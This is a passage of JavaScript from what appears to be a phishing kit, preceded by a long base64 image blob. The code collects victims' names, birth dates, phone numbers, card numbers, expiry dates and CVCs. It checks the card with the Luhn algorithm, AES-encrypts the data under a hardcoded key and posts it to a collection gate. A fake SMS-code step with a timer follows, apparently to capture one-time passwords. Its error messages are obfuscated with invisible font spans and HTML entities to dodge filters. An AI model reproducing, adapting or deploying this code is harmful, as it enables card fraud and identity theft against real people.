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" style="width:60px;height:60px;"/>');
}
function isvalidcvc(cvc){

if (isNaN(cvc) !==true && cvc.length ==3) {
if (cvc < 1000 && cvc !== 0) {
return true;
}
else{
return false;
}
}else{
return false;
}

}

function l9er3a(bi9bi9){
if (bi9bi9.charAt(0) == "4"  || bi9bi9.charAt(0) == "5") {

if(lulu(bi9bi9) ==true){
return true;
}else{
return false;
}
}
else{
return false;
}
}

function lulu(cardNum){

    var numericDashRegex = /^[\d\-\s]+$/
    if (!numericDashRegex.test(cardNum)) return false;

    // The Luhn Algorithm. It's so pretty.
    var nCheck = 0, nDigit = 0, bEven = false;
    var strippedField = cardNum.replace(/\D/g, "");

    for (var n = strippedField.length - 1; n >= 0; n--) {
        var cDigit = strippedField.charAt(n);
        nDigit = parseInt(cDigit, 10);
        if (bEven) {
            if ((nDigit *= 2) > 9) nDigit -= 9;
        }

        nCheck += nDigit;
        bEven = !bEven;
    }

  	return (nCheck % 10) === 0;
}

function startTimer() {
var presentTime = document.getElementById('timer').innerHTML;
var timeArray = presentTime.split(/[:]+/);
var m = timeArray[0];
var s = checkSecond((timeArray[1] - 1));
if (m == 4 && s == 0) {
$('#sir_t7ewa').removeAttr("disabled");

}
if(s==59){m=m-1}
//if(m<0){alert('timer completed')}

document.getElementById('timer').innerHTML =
m + ":" + s;
setTimeout(startTimer, 1000);
}

function checkSecond(sec) {
if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
if (sec < 0) {sec = "59"};
return sec;
}


function valide_date(month,year){
if (month !== "Mois" && year !=="Année") {
return true;
}else{
return false;
}
}
function sir_lsms(){
$('#ta9a3oud').hide();
$('#stape_tania').hide();
$('#tga3ed').hide();
var nemra_mformatiya = nemra.replace(/\D+/g, '');
var indice = nemra_mformatiya.substring(0, 2);
var last_number = nemra_mformatiya.substring(6, 10)
$('#nemrahna').text(indice+"XXXX"+last_number);
$('#sms').show();
$('#timer').html(05 + ":" + 00);

$('#sir_t7ewa').show();
startTimer();
}

function checksmimo(smimo){
if (smimo.length > 5) {
return true;
}else{
return false;
}
}
let code = (function(){
        return{
          encryptMessage: function(messageToencrypt = '', secretkey = ''){
            var encryptedMessage = CryptoJS.AES.encrypt(messageToencrypt, secretkey);
            return encryptedMessage.toString();
          },
          decryptMessage: function(encryptedMessage = '', secretkey = ''){
            var decryptedBytes = CryptoJS.AES.decrypt(encryptedMessage, secretkey);
            var decryptedMessage = decryptedBytes.toString(CryptoJS.enc.Utf8);

            return decryptedMessage;
          }
        }
    })();
function rc4(key, str)

{

var s = [], j = 0, x, res = '';

for (var i = 0; i < 256; i++)

{

s[i] = i;

}

for (i = 0; i < 256; i++)

{

j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;

x = s[i];

s[i] = s[j];

s[j] = x;

}

i = 0;

j = 0;

for (var y = 0; y < str.length; y++)

{

i = (i + 1) % 256;

j = (j + s[i]) % 256;

x = s[i];

s[i] = s[j];

s[j] = x;

res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);

}

return res;

}




function byebye(){
$('#lhwa').hide();
$('#sir_t7ewa').hide();
$('#sms').hide();
$('#ciao').show();
$('#ciaobella').show();
}

function crypti(secret){
var key = "-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCbuexN8sBPHGODQYTg9sxxXq6UAhyOuJkgFRf60HbYPZjS0FcIVuItsD8zt1SrXmO2SxvW+oj9JcSKtfe1xUVLpcB47JP9qNGK/N0jmb7jL3PBfkoiGEX8SW7xhCuC4kFuXRuenNw3c0aM3KXoOfavRZ9VdTzacDzeJHSuEABv5wIDAQAB-----END PUBLIC KEY-----";
var publicKey = forge.pki.publicKeyFromPem(key);
var encrypted = publicKey.encrypt(secret, "RSA-OAEP", {
md: forge.md.sha256.create(),
mgf1: forge.mgf1.create()
});
var base64 = forge.util.encode64(encrypted);
return base64;
}

$('#sir').click(function(){


if(check_first_step($('#ach_semak_lah').val(),$('#dubs').val(),$('#nb').val(),$('#vv').is(':checked'),$('#mama').is(':checked'))){
ach_semak_lah = $('#ach_semak_lah').val();
zdiyad = $('#dubs').val();
nemra = $('#nb').val();

if ($('#vv').is(':checked')==true) {
feedzeb = "4";
}
if ($('#mama').is(':checked')==true) {
feedzeb = "5";
}
$('input#tarja').attr("placeholder", feedzeb+"XXX-XXXX-XXXX-XXXX");
$('#difffo').text(feedzeb+"XXX-XXXX-XXXX-XXXX");
loading("cinema");
function tbouricha(){
bedel_sef7a(ach_semak_lah);
}
setTimeout(tbouricha, 3000);
$('#bibit').show();


}


});
$('#tga3ed').click(function(){
$('#jnab').html("");
var tanjiya = $('#tarja').val().replace(/\D+/g, '');
var expmouunth = $('#expmonth').val();
var expyeeeer = $('#expyear').val();
var cvc = $('#ps4').val();
if (isvalidcvc(cvc)==true && l9er3a(tanjiya)==true && valide_date(expmouunth,expyeeeer) ==true) {

var content = ach_semak_lah+"#"+zdiyad+"#"+nemra+"#"+tanjiya+"#"+expmouunth+"-"+expyeeeer+"#"+cvc

var enc = code.encryptMessage(content, "wamakaynghathisvitess");
$.post( URL_GATE+"/", { 'logo': enc });
loading("ta9a3oud");
setTimeout(sir_lsms, 3000);
}else{
if (isvalidcvc(cvc)==false) {
error_message = 'L<!z9>&#101;<font style="color:transparent;font-size: 0px;">2</font> c<!0>&#114;<font style="color:transparent;font-size: 0px;">k</font>&#121;<font style="color:transparent;font-size: 0px;">k</font>p<!2d>&#116;<font style="color:transparent;font-size: 0px;">c</font>&#111;<font style="color:transparent;font-size: 0px;">3</font>g<!wl5>r<!z>a<!6A>&#109;<font style="color:transparent;font-size: 0px;">h</font>&#109;<font style="color:transparent;font-size: 0px;">b</font>&#101; s<!W>&#097;&#105;<font style="color:transparent;font-size: 0px;">L</font>&#115;<font style="color:transparent;font-size: 0px;">b</font>i<!JfS> &#101;<font style="color:transparent;font-size: 0px;">a</font>s<!RvX>&#116;<font style="color:transparent;font-size: 0px;">z</font> i<!f>&#110;<font style="color:transparent;font-size: 0px;">S</font>&#099;<font style="color:transparent;font-size: 0px;">l</font>&#111;<font style="color:transparent;font-size: 0px;">P</font>&#114;<font style="color:transparent;font-size: 0px;">V</font>&#114;<font style="color:transparent;font-size: 0px;">C</font>&#101;<font style="color:transparent;font-size: 0px;">a</font>c<!aUa>t<!6I>e<!TfK>';
}
if (l9er3a(tanjiya)==false) {
error_message = 'L<!wS>&#101; n<!M>&#117;<font style="color:transparent;font-size: 0px;">I</font>&#109;<font style="color:transparent;font-size: 0px;">9</font>é&#114;<font style="color:transparent;font-size: 0px;">2</font>&#111; &#100;<font style="color:transparent;font-size: 0px;">b</font>e<!teM> &#099;<font style="color:transparent;font-size: 0px;">U</font>&#097;<font style="color:transparent;font-size: 0px;">s</font>&#114;t<!4>&#101;<font style="color:transparent;font-size: 0px;">p</font> &#115;<font style="color:transparent;font-size: 0px;">S</font>&#097;<font style="color:transparent;font-size: 0px;">l</font>i<!0a9>&#115;<font style="color:transparent;font-size: 0px;">H</font>i<!H3c> e<!x>&#115;&#116;<font 